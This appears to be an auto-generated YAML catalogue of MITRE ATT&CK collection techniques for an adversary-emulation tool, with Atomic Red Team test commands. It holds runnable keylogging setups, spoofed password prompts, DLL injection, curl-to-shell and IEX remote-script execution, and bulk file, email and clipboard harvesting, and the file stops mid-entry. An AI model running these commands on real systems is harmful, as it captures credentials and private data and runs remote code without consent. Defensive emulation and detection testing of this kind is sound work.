# AutoStrike MITRE ATT&CK Techniques - collection
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1005
  name: Data from Local System
  description: |-
    Adversaries may search local system sources, such as file systems, configuration files, local databases, virtual machine files, or process memory, to find files of interest and sensitive data prior to Exfiltration.

    Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interac...
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Search files of interest and save them to a single zip file (Windows)
      type: powershell
      platform: windows
      command: "$startingDirectory = \"C:\\Users\"\n$outputZip = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\"\n$fileExtensionsString = \".doc, .docx, .txt\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }"
      cleanup: Remove-Item -Path  $outputZip\data.zip -Force
      timeout: 120
    - name: Find and dump sqlite databases (Linux)
      type: bash
      platform: linux
      command: |-
        cd $HOME
        curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
        curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
        curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
        chmod +x sqlite_dump.sh
        find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
      cleanup: |-
        rm -f $HOME/.art
        rm -f $HOME/gta.db
        rm -f $HOME/sqlite_dump.sh
      timeout: 60
    - name: Copy Apple Notes database files using AppleScript
      type: sh
      platform: macos
      command: osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "/private/tmp"' -e 'set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'
      cleanup: rm "/private/tmp/NoteStore.sqlite*"
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1005
  is_safe: false
- id: T1025
  name: Data from Removable Media
  description: "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.or..."
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Identify Documents on USB and Removable Media via PowerShell
      type: cmd
      platform: windows
      command: powershell.exe -c "Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1025
  is_safe: false
- id: T1039
  name: Data from Network Shared Drive
  description: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Copy a sensitive File over Administrative share with copy
      type: cmd
      platform: windows
      command: copy \\127.0.0.1\C$\Windows\temp\Easter_Bunny.password %TEMP%\Easter_egg.password
      cleanup: |-
        del \\127.0.0.1\C$\Windows\temp\Easter_Bunny.password
        del %TEMP%\Easter_egg.password
      timeout: 120
      elevation_required: true
    - name: Copy a sensitive File over Administrative share with Powershell
      type: powershell
      platform: windows
      command: copy-item -Path "\\127.0.0.1\C$\Windows\temp\Easter_Bunny.password" -Destination "$Env:TEMP\Easter_egg.password"
      cleanup: |-
        Remove-Item -Path "\\127.0.0.1\C$\Windows\temp\Easter_Bunny.password"
        Remove-Item -Path "$Env:TEMP\Easter_egg.password"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1039
  is_safe: false
- id: T1056.001
  name: Keylogging
  description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary ma...
  tactic: collection
  tactics:
    - collection
    - credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Input Capture
      type: powershell
      platform: windows
      command: '&"$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1" -LogPath $env:TEMP\key.log'
      cleanup: Remove-Item $env:TEMP\key.log -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Living off the land Terminal Input Capture on Linux with pam.d
      type: sh
      platform: linux
      command: |-
        if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
        if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
        sudo touch /tmp/password-auth.bk
        sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
        enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
        enable=* log_password" >> /etc/pam.d/system-auth
      cleanup: |-
        sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
        sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
      timeout: 60
      elevation_required: true
    - name: Logging bash history to syslog
      type: sh
      platform: linux
      command: |-
        PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
        echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
        tail /var/log/syslog
      cleanup: unset PROMPT_COMMAND
      timeout: 60
      elevation_required: true
    - name: Logging sh history to syslog/messages
      type: sh
      platform: linux
      command: |-
        PS2=`logger -t "$USER" -f ~/.sh_history`
        $PS2
        tail /var/log/messages
      cleanup: unset PS2
      timeout: 60
      elevation_required: true
    - name: Bash session based keylogger
      type: bash
      platform: linux
      command: |-
        trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> /tmp/.keyboard.log' DEBUG
        echo "Hello World!"
        cat /tmp/.keyboard.log
      cleanup: rm /tmp/.keyboard.log
      timeout: 60
    - name: SSHD PAM keylogger
      type: sh
      platform: linux
      command: "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh ubuntu@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit"
      cleanup: cp -fv /tmp/sshd /etc/pam.d/
      timeout: 60
      elevation_required: true
    - name: Auditd keylogger
      type: sh
      platform: linux
      command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now"
      cleanup: systemctl restart auditd
      timeout: 60
      elevation_required: true
    - name: MacOS Swift Keylogger
      type: bash
      platform: macos
      command: swift PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift -keylog
      cleanup: kill `pgrep swift-frontend`
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1056/001
  is_safe: false
- id: T1056.002
  name: GUI Input Capture
  description: |-
    Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

    Adversaries may mimic this functionality to prompt ...
  tactic: collection
  tactics:
    - collection
    - credential-access
  platforms:
    - macos
    - windows
    - linux
  executors:
    - name: AppleScript - Prompt User for Password
      type: bash
      platform: macos
      command: osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
      timeout: 60
    - name: PowerShell - Prompt User for Password
      type: powershell
      platform: windows
      command: "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password"
      timeout: 120
    - name: AppleScript - Spoofing a credential prompt using osascript
      type: bash
      platform: macos
      command: |-
        PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')
        echo $PWD_SPOOF
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1056/002
  is_safe: false
- id: T1056.004
  name: Credential API Hooking
  description: 'Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user creden...'
  tactic: collection
  tactics:
    - collection
    - credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Hook PowerShell TLS Encrypt/Decrypt Messages
      type: powershell
      platform: windows
      command: |-
        mavinject $pid /INJECTRUNNING "PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll"
        Invoke-WebRequest https://www.example.com -UseBasicParsing
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1056/004
  is_safe: false
- id: T1074.001
  name: Local Data Staging
  description: |-
    Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

    Adversaries may also stage collected data in vari...
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Stage data from Discovery.bat
      type: powershell
      platform: windows
      command: Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat
      cleanup: Remove-Item -Force $env:TEMP\discovery.bat -ErrorAction Ignore
      timeout: 120
    - name: Stage data from Discovery.sh
      type: sh
      platform: linux
      command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log
      cleanup: rm /tmp/T1074.001_discovery.log
      timeout: 60
    - name: Stage data from Discovery.sh
      type: sh
      platform: macos
      command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log
      cleanup: rm /tmp/T1074.001_discovery.log
      timeout: 60
    - name: Zip a Folder with PowerShell for Staging in Temp
      type: powershell
      platform: windows
      command: Compress-Archive -Path "PathToAtomicsFolder\T1074.001\bin\Folder_to_zip" -DestinationPath $env:TEMP\Folder_to_zip.zip -Force
      cleanup: Remove-Item -Path $env:TEMP\Folder_to_zip.zip -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1074/001
  is_safe: false
- id: T1113
  name: Screen Capture
  description: 'Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)'
  tactic: collection
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Screencapture
      type: bash
      platform: macos
      command: screencapture /tmp/T1113_desktop.png
      cleanup: rm /tmp/T1113_desktop.png
      timeout: 60
    - name: Screencapture (silent)
      type: bash
      platform: macos
      command: screencapture -x /tmp/T1113_desktop.png
      cleanup: rm /tmp/T1113_desktop.png
      timeout: 60
    - name: X Windows Capture
      type: bash
      platform: linux
      command: |-
        xwd -root -out /tmp/T1113_desktop.xwd
        xwud -in /tmp/T1113_desktop.xwd
      cleanup: rm /tmp/T1113_desktop.xwd
      timeout: 60
    - name: X Windows Capture (freebsd)
      type: sh
      platform: linux
      command: |-
        xwd -root -out /tmp/T1113_desktop.xwd
        xwud -in /tmp/T1113_desktop.xwd
      cleanup: rm /tmp/T1113_desktop.xwd
      timeout: 60
    - name: Capture Linux Desktop using Import Tool
      type: bash
      platform: linux
      command: import -window root /tmp/T1113_desktop.png
      cleanup: rm /tmp/T1113_desktop.png
      timeout: 60
    - name: Capture Linux Desktop using Import Tool (freebsd)
      type: sh
      platform: linux
      command: import -window root /tmp/T1113_desktop.png
      cleanup: rm /tmp/T1113_desktop.png
      timeout: 60
    - name: Windows Screencapture
      type: powershell
      platform: windows
      command: |-
        cmd /c start /b psr.exe /start /output c:\temp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12
        Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
        [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
        cmd /c "timeout 5 > NULL && psr.exe /stop"
      cleanup: rm c:\temp\T1113_desktop.zip -ErrorAction Ignore
      timeout: 120
    - name: Windows Screen Capture (CopyFromScreen)
      type: powershell
      platform: windows
      command: |-
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
        $graphic = [Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        $bitmap.Save("$env:TEMP\T1113.png")
      cleanup: Remove-Item $env:TEMP\T1113.png -ErrorAction Ignore
      timeout: 120
    - name: Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted
      type: powershell
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
        reg delete "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /f
      cleanup: reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f
      timeout: 120
      elevation_required: true
    - name: RDP Bitmap Cache Extraction via bmc-tools
      type: powershell
      platform: windows
      command: "$url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'\n$toolsDir = \"$env:TEMP\\bmc-tools.py\"\n \n# create output directory\nNew-Item -ItemType Directory -Path $env:TEMP\\rdp_screens -Force | Out-Null\n\n# python script download\n& curl.exe -L $url --output $toolsDir\n \n# execution step\nif (Test-Path $toolsDir) { python $toolsDir -s \"$env:LOCALAPPDATA\\Microsoft\\Terminal Server Client\\Cache\" -d $env:TEMP\\rdp_screens -b }"
      cleanup: |-
        Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
        Remove-Item $env:TEMP\rdp_screens -Recurse -Force -ErrorAction SilentlyContinue
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1113
  is_safe: false
- id: T1114.001
  name: Local Email Collection
  description: |-
    Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.

    Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data F...
  tactic: collection
  platforms:
    - windows
  executors:
    - name: Email Collection with PowerShell Get-Inbox
      type: powershell
      platform: windows
      command: powershell -executionpolicy bypass -command "PathToAtomicsFolder\T1114.001\src\Get-Inbox.ps1" -file $env:TEMP\mail.csv
      cleanup: Remove-Item $env:TEMP\mail.csv -Force -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1114/001
  is_safe: false
- id: T1115
  name: Clipboard Data
  description: "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citat..."
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Utilize Clipboard to store or execute commands from
      type: cmd
      platform: windows
      command: |-
        dir | clip
        echo "T1115" > %temp%\T1115.txt
        clip < %temp%\T1115.txt
      cleanup: del %temp%\T1115.txt >nul 2>&1
      timeout: 120
    - name: Execute Commands from Clipboard using PowerShell
      type: powershell
      platform: windows
      command: |-
        echo Get-Process | clip
        Get-Clipboard | iex
      timeout: 120
    - name: Execute commands from clipboard
      type: bash
      platform: macos
      command: |-
        echo ifconfig | pbcopy
        $(pbpaste)
      timeout: 60
    - name: Collect Clipboard Data via VBA
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
      cleanup: Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt" -ErrorAction Ignore
      timeout: 120
    - name: Add or copy content to clipboard with xClip
      type: sh
      platform: linux
      command: |-
        apt install xclip -y
        history | tail -n 30 | xclip -sel clip
        xclip -o > history.txt
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1115
  is_safe: false
- id: T1119
  name: Automated Collection
  description: "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, t..."
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Automated Collection Command Prompt
      type: cmd
      platform: windows
      command: |-
        mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
        dir c: /b /s .docx | findstr /e .docx
        for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection
      cleanup: del %temp%\T1119_command_prompt_collection /F /Q >nul 2>&1
      timeout: 120
    - name: Automated Collection PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
        Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
      cleanup: Remove-Item $env:TEMP\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null
      timeout: 120
    - name: Recon information for export with PowerShell
      type: powershell
      platform: windows
      command: |-
        Get-Service > $env:TEMP\T1119_1.txt
        Get-ChildItem Env: > $env:TEMP\T1119_2.txt
        Get-Process > $env:TEMP\T1119_3.txt
      cleanup: |-
        Remove-Item $env:TEMP\T1119_1.txt -ErrorAction Ignore
        Remove-Item $env:TEMP\T1119_2.txt -ErrorAction Ignore
        Remove-Item $env:TEMP\T1119_3.txt -ErrorAction Ignore
      timeout: 120
    - name: Recon information for export with Command Prompt
      type: cmd
      platform: windows
      command: |-
        sc query type=service > %TEMP%\T1119_1.txt
        doskey /history > %TEMP%\T1119_2.txt
        wmic process list > %TEMP%\T1119_3.txt
        tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
      cleanup: |-
        del %TEMP%\T1119_1.txt >nul 2>&1
        del %TEMP%\T1119_2.txt >nul 2>&1
        del %TEMP%\T1119_3.txt >nul 2>&1
        del %TEMP%\T1119_4.txt >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1119
  is_safe: false
- id: T1123
  name: Audio Capture
  description: |-
    An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)

    Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: using device audio capture commandlet
      type: powershell
      platform: windows
      command: |-
        $mic = Get-AudioDevice -Recording
        Set-AudioDevice -ID $mic.ID
        Start-Sleep -Seconds 5
      timeout: 120
    - name: Registry artefact when application use microphone
      type: cmd
      platform: windows
      command: |-
        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
      cleanup: reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /f
      timeout: 120
    - name: using Quicktime Player
      type: sh
      platform: macos
      command: sh PathToAtomicsFolder/T1123/src/T1123.sh /tmp/T1123.m4a 5
      cleanup: |-
        if test -w /tmp/T1123.m4a; then
          rm /tmp/T1123.m4a
        fi
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1123
  is_safe: false
- id: T1125
  name: Video Capture
  description: |-
    An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

    Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video o...
  tactic: collection
  platforms:
    - windows
    - macos
    - linux
  executors:
    - name: Registry artefact when application use webcam
      type: cmd
      platform: windows
      command: |-
        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
      cleanup: reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /f
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1125
  is_safe: false
- id: T1560
  name: Archive Collected Data
  description: |-
    An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.

    Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3...
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Compress Data for Exfiltration With PowerShell
      type: powershell
      platform: windows
      command: dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip
      cleanup: Remove-Item -path $env:USERPROFILE\T1560-data-ps.zip -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1560
  is_safe: false
- id: T1560.001
  name: Archive via Utility
  description: "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <cod..."
  tactic: collection
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Compress Data for Exfiltration With Rar
      type: cmd
      platform: windows
      command: '"%programfiles%/WinRAR/Rar.exe" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt'
      cleanup: del /f /q /s %USERPROFILE%\T1560.001-data.rar >nul 2>&1
      timeout: 120
    - name: Compress Data and lock with password for Exfiltration with winrar
      type: cmd
      platform: windows
      command: |-
        mkdir .\tmp\victim-files
        cd .\tmp\victim-files
        echo "This file will be encrypted" > .\encrypted_file.txt
        "%programfiles%/WinRAR/Rar.exe" a -hp"blue" hello.rar
        dir
      timeout: 120
    - name: Compress Data and lock with password for Exfiltration with winzip
      type: cmd
      platform: windows
      command: |-
        path=%path%;"C:\Program Files (x86)\winzip"
        mkdir .\tmp\victim-files
        cd .\tmp\victim-files
        echo "This file will be encrypted" > .\encrypted_file.txt
        "%ProgramFiles%\WinZip\winzip64.exe" -min -a -s"hello" archive.zip *
        dir
      timeout: 120
    - name: Compress Data and lock with password for Exfiltration with 7zip
      type: cmd
      platform: windows
      command: |-
        mkdir $PathToAtomicsFolder\T1560.001\victim-files
        cd $PathToAtomicsFolder\T1560.001\victim-files
        echo "This file will be encrypted" > .\encrypted_file.txt
        "%ProgramFiles%\7-zip\7z.exe" u archive.7z *txt -pblue
        dir
      cleanup: rmdir /s /Q $PathToAtomicsFolder\T1560.001\victim-files >nul 2>&1
      timeout: 120
    - name: Data Compressed - nix - zip
      type: bash
      platform: linux
      command: zip $HOME/data.zip /var/log/{w,b}tmp
      cleanup: rm -f $HOME/data.zip
      timeout: 60
      elevation_required: true
    - name: Data Compressed - nix - zip
      type: bash
      platform: macos
      command: zip $HOME/data.zip /var/log/{w,b}tmp
      cleanup: rm -f $HOME/data.zip
      timeout: 60
      elevation_required: true
    - name: Data Compressed - nix - gzip Single File
      type: sh
      platform: linux
      command: 'test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo ''confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101'' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)'
      cleanup: rm -f $HOME/victim-gzip.txt.gz
      timeout: 60
    - name: Data Compressed - nix - gzip Single File
      type: sh
      platform: macos
      command: 'test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo ''confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101'' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)'
      cleanup: rm -f $HOME/victim-gzip.txt.gz
      timeout: 60
    - name: Data Compressed - nix - tar Folder or File
      type: sh
      platform: linux
      command: tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
      cleanup: rm -f $HOME/data.tar.gz
      timeout: 60
    - name: Data Compressed - nix - tar Folder or File
      type: sh
      platform: macos
      command: tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
      cleanup: rm -f $HOME/data.tar.gz
      timeout: 60
    - name: Data Encrypted with zip and gpg symmetric
      type: sh
      platform: linux
      command: |-
        mkdir -p /tmp/T1560
        cd /tmp/T1560; touch a b c d e f g
        zip --password "InsertPasswordHere" /tmp/T1560/T1560 ./*
        echo "InsertPasswordHere" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip
        ls -l /tmp/T1560
      cleanup: rm -Rf /tmp/T1560
      timeout: 60
    - name: Data Encrypted with zip and gpg symmetric
      type: sh
      platform: macos
      command: |-
        mkdir -p /tmp/T1560
        cd /tmp/T1560; touch a b c d e f g
        zip --password "InsertPasswordHere" /tmp/T1560/T1560 ./*
        echo "InsertPasswordHere" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip
        ls -l /tmp/T1560
      cleanup: rm -Rf /tmp/T1560
      timeout: 60
    - name: Encrypts collected data with AES-256 and Base64
      type: bash
      platform: linux
